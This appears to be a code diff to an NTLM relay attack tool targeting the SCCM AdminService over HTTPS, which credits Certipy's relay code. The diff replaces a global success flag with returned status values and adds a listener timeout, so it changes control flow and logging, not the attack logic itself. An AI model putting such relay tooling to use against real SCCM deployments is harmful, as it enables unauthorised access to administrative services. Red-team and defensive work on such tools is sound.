@@ -124,20 +124,19 @@ class SCCMHTTPSRelayClient(HTTPSRelayClient):
                     logger.debug(f"Response data:")
                     jprint(response_content)
                     SUCCESS = True
-                    return
+                    return (response_content, STATUS_SUCCESS)
                 if res.status == 401:
                     logger.info("Got unauthorized response from SCCM AdminService")
-                    SUCCESS = True
-                    return
+                    return (None, STATUS_ACCESS_DENIED)
                 else:
                     logger.info(f"Unexpected status code: {res.status}")
                     logger.debug(f"Response data: {response_data.decode('utf-8', errors='ignore')}")
-                    SUCCESS = True
-                    return
+                    return (None, STATUS_ACCESS_DENIED)
+            else:
+                return (None, STATUS_SUCCESS)
         except Exception as e:
             logger.info(f"Something went wrong:\n{e}")
-            SUCCESS = True
-            return
+            return (None, STATUS_ACCESS_DENIED)
         
         
 
@@ -177,6 +176,7 @@ class HTTPSCCMRELAY:
         """All taken from Certipy's relay implementation https://github.com/ly4k/Certipy"""
         logger.info("Listening on %s:%d" % (self.interface, self.port))
         logger.info("Waiting for incoming connections...")
+        logger.info(f"Will give up after {self.timeout}s with no successful attack.")
 
         self.server.start()
 
@@ -185,6 +185,9 @@ class HTTPSCCMRELAY:
         try:
             # Main loop with timeout check
             while not SUCCESS:                    
+                if time.time() - start_time > self.timeout:
+                    logger.info("Timeout reached, no successful attack.")
+                    break
                 time.sleep(0.1)
                 
         except KeyboardInterrupt:
